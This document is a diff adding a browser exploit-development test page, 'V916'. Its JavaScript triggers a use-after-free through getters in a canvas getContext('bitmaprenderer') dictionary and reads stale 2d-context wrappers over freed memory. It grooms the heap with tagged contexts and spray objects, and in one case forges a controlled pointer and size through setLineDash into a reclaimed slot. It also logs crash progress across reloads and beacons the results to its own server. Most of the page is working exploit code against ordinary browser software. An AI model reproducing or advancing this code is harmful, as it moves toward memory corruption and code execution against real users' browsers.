@@ -1,0 +1,491 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+<title>V916 - dual-UAF + stale-read + dash-forge</title>
+<style>
+  body { background:#0b0e14; color:#d7e0ea; font-family:ui-monospace,Menlo,monospace; padding:14px; }
+  h1 { color:#58a6ff; font-size:15px; margin:0 0 6px; }
+  p  { color:#8b949e; font-size:12px; margin:4px 0 10px; line-height:1.55; }
+  pre { font-size:12px; white-space:pre-wrap; }
+  table { border-collapse:collapse; font-size:11px; margin-top:8px; }
+  td,th { border:1px solid #30363d; padding:3px 7px; text-align:left; vertical-align:top; }
+  th { color:#58a6ff; }
+  .crash { color:#ff7b72; }
+  .ok { color:#7ee787; }
+  .skip { color:#d29922; }
+  .hit { color:#ffa657; font-weight:bold; }
+  .bad { color:#ff7b72; font-weight:bold; }
+  code { color:#c9d1d9; background:#21262d; padding:1px 5px; border-radius:4px; }
+  .key { border-left:3px solid #d29922; padding-left:8px; }
+</style>
+</head>
+<body>
+<h1>V916 - dual-UAF + stale-read + dash-forge</h1>
+
+<p class="key">
+<b>Four untested surfaces from the 11-07 review (REVIEW_2026-11-07.md):</b>
+<b>(1) dual-UAF:</b> two dictionary getters (alpha + colorSpace) each create a 2d ctx on the same canvas
+-> ctx A freed during the parse, ctx B freed by the outer assignment = <b>two freed 768B slots + two
+stale wrappers from ONE trigger</b>. Detector: with 12 taggers, lw1 != lw2 proves two distinct slots.
+<b>(2) stale-read:</b> with NO spray, an unreclaimed wrapper's +112 = the old m_stateStack pointer
+(freed-but-mapped state buffer) -> lineWidth should return <b>4444.5</b> (our marker in State[32])
+without crashing = the first readable freed-memory return ever. If it crashes, V683's wall is real.
+<b>(3) dash-forge:</b> 1 tagger takes S2 (LIFO), S1 stays free; the aliased tagger's setLineDash(96
+doubles) allocates a 768B dash buffer that takes S1 -> wrapper1's +112/+120 = dash[14]/dash[15] =
+<b>fully controlled forged pointer + m_size, re-armable via setLineDash</b> (crash expected with a
+DEADBEEF forge; the no-dash twin surviving is the A/B control).
+<b>(4) fillStyle/strokeStyle through the stale wrapper</b> (never read before): live-alias control,
+freed-state read, pattern-object read, and a dropped-pattern second-order UAF probe.
+Controls: same-none MISS, imagedata-16x12 + abzero CRASH. Markers: 4444.5 / 7.77 / 0.42 / 2.222 / 5.55.
+</p>
+
+<p>
+Start: <b>?op=auto</b> &nbsp;|&nbsp; one case: <b>?case=dual-zero</b> &nbsp;|&nbsp; clear: <b>?reset=1</b>
+<br>After a crash just reopen <b>?op=auto</b>. Done when the page prints <b>ALL CASES DONE</b>.
+</p>
+
+<h2>Cases (16)</h2>
+<pre>
+#0  single-ctl    single trigger, no spray, read W1      (V683 clean replication)
+#1  dual-zero     dual trigger, no spray, read W1 + W2   (freed-read milestone)
+#2  dual-t1       dual, 1 tagger, read W1 + W2           (S2 tagged, S1 free)
+#3  dual-t12      dual, 12 taggers, read W1 + W2         (lw1 != lw2 = two slots)
+#4  dash-forge    dual, 1 tagger, setLineDash forged, read W1  (crash expected)
+#5  dash-zero     dual, 1 tagger, setLineDash zeros, read W1   (crash expected)
+#6  fill-alias    dual-t1 + W2.fillStyle/strokeStyle     (live-alias control)
+#7  fill-freed    dual-zero + W1.fillStyle/strokeStyle   (freed-state object read)
+#8  fill-pattern  pattern set pre-save, dual-zero, W1.fillStyle
+#9  fill-pdrop    same + pattern ref dropped + gc        (second-order UAF probe)
+#10-13 mmcl-eq24/mix24/12/32  (MediaQueryExp clause-shape variants)
+#14-15 controls imagedata-16x12, abzero (must CRASH)
+</pre>
+
+<pre id="out">starting...</pre>
+<div id="tbl"></div>
+
+<p class="note">Review basis: 175 cases V907-V914 = 0 SUSPECT. This probe tests the four surfaces the review found untested. Markers: 4444.5 = freed State[32].lineWidth; 7.77/0.42/2.222/5.55 = ml/ga/ldo/sb.</p>
+
+<script>
+'use strict';
+
+var SEEK = location.pathname;
+var RUN = 'r' + Date.now().toString(36) + '-' + Math.random().toString(36).slice(2, 7);
+
+function lsGet(k) { try { return window.localStorage.getItem('v916_' + k); } catch (e) { return null; } }
+function lsSet(k, v) { try { window.localStorage.setItem('v916_' + k, String(v)); } catch (e) {} }
+function lsDel(k) { try { window.localStorage.removeItem('v916_' + k); } catch (e) {} }
+
+function bks(tag, body) {
+  var u = '/beacon/V916-' + tag + '?d=' +
+          encodeURIComponent(String(body == null ? '' : body).slice(0, 460)) +
+          '&run=' + encodeURIComponent(RUN) + '&t=' + Date.now() + '&s=1';
+  try { var x = new XMLHttpRequest(); x.open('GET', u, false); x.send(null); }
+  catch (e) { try { var i = new Image(); i.src = u; } catch (e2) {} }
+}
+
+var O = document.getElementById('out');
+function say(s) { O.textContent += '\n' + s; }
+function errOf(e) { return e ? String(e.name || 'Error') + ':' + String(e.message || '').slice(0, 70) : 'none'; }
+function hexOf(x) { var f = new Float64Array(1), u = new Uint32Array(f.buffer); f[0] = x; return '0x' + ('00000000' + u[1].toString(16)).slice(-8) + ('00000000' + u[0].toString(16)).slice(-8); }
+function stLast(id, stage) { try { lsSet('last', id + ':' + stage); } catch (e) {} }
+
+/* ---------- UAF trigger ---------- */
+/* dual=false: only alpha getter creates the 2d ctx (classic V680 trigger).
+   dual=true : alpha getter creates ctx A; colorSpace getter creates ctx B on the SAME
+   canvas -> B's creation frees A; the outer bitmaprenderer assignment frees B.
+   Both getters run the same state setup (styles + nsaves saves + final lineWidth). */
+var MKPATTERN = null;   /* set by fill cases: function(helper) -> pattern or null */
+
+function stateSetup(ctx, nsaves) {
+  try {
+    if (MKPATTERN) {
+      var pat = MKPATTERN(ctx);
+      if (pat) ctx.fillStyle = pat;
+    }
+    ctx.lineWidth = 3.14159;
+    ctx.miterLimit = 7.77;
+    ctx.globalAlpha = 0.42;
+    ctx.lineDashOffset = 2.222;
+    ctx.shadowBlur = 5.55;
+    for (var s = 0; s < nsaves; s++) ctx.save();
+    ctx.lineWidth = 4444.5;
+  } catch (e) {}
+}
+
+function trigger(canvas, nsaves, dual) {
+  var w1 = null, w2 = null;
+  var dict = {};
+  Object.defineProperty(dict, 'alpha', {
+    get: function () {
+      var ctx = canvas.getContext('2d');
+      if (!ctx) return true;
+      w1 = ctx;
+      stateSetup(ctx, nsaves);
+      return true;
+    }
+  });
+  if (dual) {
+    Object.defineProperty(dict, 'colorSpace', {
+      get: function () {
+        var ctx = canvas.getContext('2d');
+        if (!ctx) return 'srgb';
+        w2 = ctx;
+        stateSetup(ctx, nsaves);
+        return 'srgb';
+      }
+    });
+  }
+  var bmp = null;
+  try { bmp = canvas.getContext('bitmaprenderer', dict); } catch (e2) {}
+  return { w1: w1, w2: w2, bmp: bmp };
+}
+
+/* ---------- read helpers ---------- */
+function readLW(w) {
+  var out = { v: null, e: null };
+  try { out.v = w.lineWidth; } catch (e) { out.e = errOf(e); }
+  return out;
+}
+function readStyle(w) {
+  var out = {};
+  try { var v = w.fillStyle; out.fs = (typeof v) + ':' + String(v).slice(0, 30); } catch (e) { out.fs = 'ERR:' + errOf(e); }
+  try { var v2 = w.strokeStyle; out.ss = (typeof v2) + ':' + String(v2).slice(0, 30); } catch (e) { out.ss = 'ERR:' + errOf(e); }
+  return out;
+}
+function lwTag(lw, made) {
+  if (typeof lw === 'number' && lw >= 200 && lw < 200 + made) return 'MISS';
+  if (lw === 4444.5) return 'FREED';
+  if (typeof lw === 'number') return 'SUSPECT';
+  return 'ODD';
+}
+
+/* ---------- builder ---------- */
+var KEEP = null;
+function buildEntry(e, helper, helperCanvas) {
+  var t = e.t, n = e.n, a = e.a, out = [], i, j;
+  if (t === 'none') {
+    out = [];
+  } else if (t === 'imagedata') {
+    var wh = String(a).split('x');
+    var w = parseInt(wh[0], 10), h = parseInt(wh[1], 10);
+    out = new Array(n);
+    for (i = 0; i < n; i++) {
+      try { out[i] = helper.createImageData(w, h); } catch (e4) { out[i] = null; }
+    }
+  } else if (t === 'abzero') {
+    out = new Array(n);
+    for (i = 0; i < n; i++) out[i] = new ArrayBuffer(768);
+  } else if (t === 'mmcl') {
+    var qs = '';
+    if (a === 'eq24') {
+      qs = '(min-width: 1px)';
+      for (j = 1; j < 24; j++) qs += ' and (min-width: ' + (2 + j) + 'px)';
+    } else if (a === 'mix24') {
+      qs = '(min-width: 1px)';
+      for (j = 1; j < 24; j++) qs += ((j & 1) ? ' and (max-width: ' : ' and (min-height: ') + (500 + j) + 'px)';
+    } else {
+      var cnt = parseInt(a, 10);
+      qs = '(min-width: 1px)';
+      for (j = 1; j < cnt; j++) qs += ' and (max-width: ' + (500 + j) + 'px)';
+    }
+    out = new Array(n);
+    for (i = 0; i < n; i++) {
+      try { out[i] = window.matchMedia(qs); } catch (e11) { out[i] = null; }
+    }
+  }
+  KEEP = out;
+  return out;
+}
+
+/* 24 tagged real contexts, V680 detector */
+function tagContexts(n) {
+  var keep = [], made = 0, c;
+  for (c = 0; c < n; c++) {
+    var cc = document.createElement('canvas');
+    cc.width = 1; cc.height = 1;
+    var cx = null;
+    try { cx = cc.getContext('2d'); } catch (e) {}
+    if (cx) {
+      try { cx.lineWidth = 200 + made; } catch (e2) {}
+      keep.push(cc);
+      made++;
+    }
+  }
+  return { keep: keep, made: made };
+}
+
+/* ---------- table ---------- */
+var TABLE = [];
+function add(id, t, n, a, saves, dual) { TABLE.push({ id: id, t: t, n: n, a: a, saves: saves, dual: dual }); }
+add('single-ctl', 'uaf', 0, 0, 32, false);
+add('dual-zero', 'uaf', 0, 0, 32, true);
+add('dual-t1', 'uaf', 1, 0, 32, true);
+add('dual-t12', 'uaf', 12, 0, 32, true);
+add('dash-forge', 'uaf', 1, 'forge', 32, true);
+add('dash-zero', 'uaf', 1, 'zero', 32, true);
+add('fill-alias', 'uaf', 1, 'fill-alias', 32, true);
+add('fill-freed', 'uaf', 0, 'fill-freed', 32, true);
+add('fill-pattern', 'uaf', 0, 'fill-pattern', 32, true);
+add('fill-pdrop', 'uaf', 0, 'fill-pdrop', 32, true);
+add('mmcl-eq24', 'mmcl', 16, 'eq24', 32, false);
+add('mmcl-mix24', 'mmcl', 16, 'mix24', 32, false);
+add('mmcl-12', 'mmcl', 16, '12', 32, false);
+add('mmcl-32', 'mmcl', 16, '32', 32, false);
+add('imagedata-16x12', 'imagedata', 16, '16x12', 32, false);
+add('abzero', 'abzero', 16, 768, 32, false);
+
+function findEntry(id) { for (var i = 0; i < TABLE.length; i++) if (TABLE[i].id === id) return TABLE[i]; return null; }
+
+/* ---------- cases ---------- */
+function runCase(id) {
+  var e = findEntry(id);
+  if (!e) return { tag: 'SKIP', detail: 'unknown-case' };
+
+  var canvas = document.createElement('canvas');
+  canvas.width = 1; canvas.height = 1;
+  document.body.appendChild(canvas);
+  window._v916canvas = canvas;
+
+  var helperCanvas = document.createElement('canvas');
+  helperCanvas.width = 1; helperCanvas.height = 1;
+  document.body.appendChild(helperCanvas);
+  var helper = null;
+  try { helper = helperCanvas.getContext('2d'); } catch (eH) {}
+  window._v916helper = [helper, helperCanvas];
+
+  /* pattern setup for fill cases */
+  MKPATTERN = null;
+  var heldPattern = null;
+  if (e.a === 'fill-pattern' || e.a === 'fill-pdrop') {
+    MKPATTERN = function (ctx) {
+      try { return helper.createPattern(helperCanvas, 'repeat'); } catch (eP) { return null; }
+    };
+  }
+
+  var t = trigger(canvas, e.saves, e.dual);
+  if (!t.w1 || !t.bmp) return { tag: 'THROW', detail: 'trigger-failed:w1=' + !!t.w1 + ',w2=' + !!t.w2 + ',bmr=' + !!t.bmp };
+  stLast(id, 'S1-trigger');
+
+  var isUaf = (e.t === 'uaf');
+
+  /* candidate spray (non-UAF cases) */
+  if (!isUaf) {
+    try { buildEntry(e, helper, helperCanvas); } catch (eK) {}
+    stLast(id, 'S2-candidate');
+  }
+
+  /* pattern drop for fill-pdrop */
+  if (e.a === 'fill-pdrop' && heldPattern === null) {
+    try { heldPattern = t.w1.fillStyle; } catch (eP1) {}
+  }
+
+  /* taggers */
+  var tk = { made: 0, keep: [] };
+  if (isUaf && e.n > 0) {
+    tk = tagContexts(e.n);
+    stLast(id, 'S2-tagged');
+  } else if (isUaf) {
+    stLast(id, 'S2-nospray');
+  } else {
+    var tk2 = tagContexts(24);
+    tk = tk2;
+    stLast(id, 'S3-tagged');
+  }
+
+  /* dash-forge / dash-zero: setLineDash through the aliased tagger */
+  var dashNote = '';
+  if (isUaf && (e.a === 'forge' || e.a === 'zero')) {
+    stLast(id, 'S3-dash');
+    var idx = -1, k;
+    var lwProbe = readLW(t.w2);
+    if (lwProbe.v !== null && lwProbe.v >= 200 && lwProbe.v < 200 + tk.made) idx = lwProbe.v - 200;
+    if (idx >= 0 && tk.keep[idx]) {
+      var tc = tk.keep[idx].getContext('2d');
+      if (tc) {
+        var dash = new Array(96);
+        var f = new Float64Array(1), u = new Uint32Array(f.buffer);
+        for (k = 0; k < 96; k++) dash[k] = 1.5 + k;
+        if (e.a === 'forge') {
+          /* dash[14] -> w(+112) bits = 0x0000414141414141 ; dash[15] -> m_size/cap */
+          u[1] = 0x00004141; u[0] = 0x41414141; dash[14] = f[0];
+          u[1] = 0x00000001; u[0] = 0x00000001; dash[15] = f[0]; /* size=1, cap=1 */
+        } else {
+          dash[14] = 0; dash[15] = 0;
+        }
+        try { tc.setLineDash(dash); dashNote = ',dash=ok'; } catch (eD) { dashNote = ',dash=ERR:' + errOf(eD); }
+      }
+    } else {
+      dashNote = ',no-alias(lw2=' + lwProbe.v + ')';
+    }
+  }
+
+  /* reads */
+  var parts = [], tag = 'MISS', freed = false, suspect = false;
+  var lw1 = null, lw2 = null;
+  if (isUaf) {
+    stLast(id, 'S4-read-w1');
+    var r1 = readLW(t.w1);
+    lw1 = r1.v;
+    parts.push('lw1=' + (r1.e ? 'ERR:' + r1.e : lw1 + (typeof lw1 === 'number' ? ':' + hexOf(lw1) : '')));
+
+    if (t.w2) {
+      stLast(id, 'S5-read-w2');
+      var r2 = readLW(t.w2);
+      lw2 = r2.v;
+      parts.push('lw2=' + (r2.e ? 'ERR:' + r2.e : lw2 + (typeof lw2 === 'number' ? ':' + hexOf(lw2) : '')));
+    }
+
+    /* style reads for fill cases */
+    if (e.a === 'fill-alias' && t.w2) {
+      stLast(id, 'S6-fill-alias');
+      var st2 = readStyle(t.w2);
+      parts.push('fs2=' + st2.fs, 'ss2=' + st2.ss);
+    }
+    if (e.a === 'fill-freed') {
+      stLast(id, 'S6-fill-freed');
+      var st1 = readStyle(t.w1);
+      parts.push('fs1=' + st1.fs, 'ss1=' + st1.ss);
+    }
+    if (e.a === 'fill-pattern' || e.a === 'fill-pdrop') {
+      stLast(id, 'S6-fill-pattern');
+      var stp = readStyle(t.w1);
+      parts.push('fs1=' + stp.fs, 'ss1=' + stp.ss);
+    }
+
+    /* classification */
+    var t1 = (lw1 === null && t.w1) ? 'THROW' : lwTag(lw1, tk.made);
+    var t2 = t.w2 ? ((lw2 === null) ? 'THROW' : lwTag(lw2, tk.made)) : 'NA';
+    if (t1 === 'FREED' || t2 === 'FREED') { tag = 'SUSPECT'; freed = true; }
+    else if (t1 === 'SUSPECT' || t2 === 'SUSPECT' || t1 === 'ODD' || t2 === 'ODD') { tag = 'SUSPECT'; suspect = true; }
+    else if (t1 === 'THROW' || t2 === 'THROW') tag = 'THROW';
+    else tag = 'MISS';
+
+    if (freed) parts.push('FREED-READ');
+    if (e.n === 12 && typeof lw1 === 'number' && typeof lw2 === 'number') {
+      parts.push('slots=' + (lw1 !== lw2 ? 'TWO' : 'ONE'));
+    }
+  } else {
+    stLast(id, 'S4-read');
+    var rc = readLW(t.w1);
+    var lwc = rc.v;
+    parts.push('lw=' + (rc.e ? 'ERR:' + rc.e : lwc + (typeof lwc === 'number' ? ':' + hexOf(lwc) : '')));
+    var tc2 = lwTag(lwc, tk.made);
+    if (tc2 === 'FREED' || tc2 === 'SUSPECT' || tc2 === 'ODD') { tag = 'SUSPECT'; suspect = true; }
+    else tag = tc2 === 'THROW' ? 'THROW' : 'MISS';
+  }
+
+  var base = 't=' + e.t + ',n=' + e.n + ',a=' + e.a + ',dual=' + (e.dual ? 1 : 0) + ',saves=' + e.saves + ',made=' + tk.made + dashNote;
+  return { tag: tag, detail: base + ',' + parts.join(',') };
+}
+
+function findEntry2(id) { for (var i = 0; i < TABLE.length; i++) if (TABLE[i].id === id) return TABLE[i]; return null; }
+
+var SEQUENCE = [];
+for (var qi = 0; qi < TABLE.length; qi++) SEQUENCE.push(TABLE[qi].id);
+
+var EXPECT = {
+  'imagedata-16x12': 'CRASH (control)', 'abzero': 'CRASH (control)',
+  'same-none': 'MISS (control)',
+  'dash-forge': 'CRASH expected (forge confirmed)', 'dash-zero': 'CRASH expected',
+  'dual-zero': 'SUSPECT 4444.5 = channel open / CRASH = wall real'
+};
+
+function appendRes(s) { lsSet('res', (lsGet('res') || '') + s + ';'); }
+function isDone(id) { return (lsGet('done') || ';').indexOf(';' + id + ';') >= 0; }
+function markDone(id) { var d = lsGet('done') || ';'; if (d.indexOf(';' + id + ';') < 0) lsSet('done', d + id + ';'); }
+function nextCase() { for (var i = 0; i < SEQUENCE.length; i++) { if (!isDone(SEQUENCE[i])) return SEQUENCE[i]; } return null; }
+
+function esc(s) { return String(s).replace(/&/g, '&').replace(/</g, '<').replace(/>/g, '>'); }
+function render() {
+  var r = lsGet('res') || '';
+  var rows = r.split(';');
+  var html = '<table><tr><th>case</th><th>expected</th><th>result</th><th>detail</th></tr>';
+  for (var i = 0; i < rows.length; i++) {
+    if (!rows[i]) continue;
+    var p = rows[i].split('|');
+    var cls = (p[1] === 'CRASH') ? 'crash' : (p[1] === 'SUSPECT' ? 'hit' : (p[1] === 'SKIP' ? 'skip' : 'ok'));
+    var det = p[2] || '';
+    var alarm = (p[1] === 'SUSPECT');
+    html += '<tr><td>' + esc(p[0]) + '</td><td>' + esc(EXPECT[p[0]] || '') +
+            '</td><td class="' + cls + '">' + esc(p[1]) + '</td><td' + (alarm ? ' class="bad"' : '') + '>' + esc(det) + '</td></tr>';
+  }
+  html += '</table>';
+  document.getElementById('tbl').innerHTML = html;
+}
+
+async function runOne(id) {
+  bks('START', 'case=' + id + ',run=' + RUN);
+  lsSet('cur', id);
+  lsSet('last', id + ':S0-enter');
+
+  var r;
+  try { r = runCase(id); }
+  catch (e) { r = { tag: 'THROW', detail: 'harness=' + errOf(e) }; }
+
+  appendRes(id + '|' + r.tag + '|' + (r.detail || ''));
+  markDone(id);
+  lsSet('cur', '');
+  lsSet('last', id + ':S9-done');
+  bks('DONE', 'case=' + id + ',tag=' + r.tag + ',detail=' + (r.detail || '').slice(0, 380));
+  say(id + ' -> ' + r.tag + ' ' + (r.detail || ''));
+  render();
+  return r;
+}
+
+async function main() {
+  var q = location.search;
+
+  if (q.indexOf('reset=1') >= 0) {
+    lsDel('cur'); lsDel('done'); lsDel('res'); lsDel('last');
+    bks('RESET', 'cleared,run=' + RUN);
+    say('cleared. reopen with ?op=auto');
+    render();
+    return;
+  }
+
+  var cur = lsGet('cur');
+  if (cur) {
+    var last = lsGet('last') || '?';
+    appendRes(cur + '|CRASH|last=' + last);
+    markDone(cur);
+    lsDel('cur');
+    lsDel('last');
+    bks('CRASH-DETECTED', 'case=' + cur + ',last=' + last + ',run=' + RUN);
+    say('previous case CRASHED: ' + cur + ' last=' + last);
+  }
+
+  var m = /[?&]case=([^&]+)/.exec(q);
+  var one = m ? decodeURIComponent(m[1]) : '';
+  var auto = (q.indexOf('op=auto') >= 0) || (!one && q.indexOf('case=') < 0);
+
+  if (one) {
+    var rr = await runOne(one);
+    say('single case done: ' + one + ' -> ' + rr.tag);
+    render();
+    return;
+  }
+
+  if (auto) {
+    var id = nextCase();
+    if (!id) {
+      bks('FINAL', 'run=' + RUN + ',res=' + (lsGet('res') || '').slice(0, 440));
+      say('ALL CASES DONE.');
+      render();
+      return;
+    }
+    await runOne(id);
+    setTimeout(function () { location.href = SEEK + '?op=auto&r=' + Date.now(); }, 700);
+    return;
+  }
+
+  say('ready. use ?op=auto or ?case=<id>');
+  render();
+}
+
+try { main(); } catch (e) { bks('FATAL', errOf(e)); say('FATAL ' + errOf(e)); }
+</script>
+</body>
+</html>
